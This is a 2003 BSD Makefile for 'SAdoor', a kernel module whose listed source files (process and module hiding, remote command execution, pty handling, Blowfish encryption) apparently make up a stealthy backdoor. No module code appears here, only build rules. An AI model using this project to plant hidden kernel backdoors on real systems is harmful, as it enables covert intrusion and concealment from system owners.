 #
 #  File: Makefile
 #  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 #  Description: SAdoor kmod compile rules
 #  Version: 1.0
 #  Date: Thu Jul  3 15:48:22 CEST 2003
 #
 #  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #   notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #   notice, this list of conditions and the following disclaimer in the
 #   documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #   derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #

.include <bsd.own.mk>
#.PATH: $S/netinet

#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#
#CFLAGS += -DINET
SRCS    = sadoor_lkm.c sadoor.pkts.c input_wrapper.c utils.c command.c conn.c \
		  connloop.c do_system.c pty.c hide_procs.c iface.c replay.c \
		  hide_module.c bfish_cfb.c bfish_decrypt.c bfish_encrypt.c \
		  bfish_keyinit.c bfish_ofb.c
KMOD    = sadoor
#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#

.include <bsd.kmod.mk>
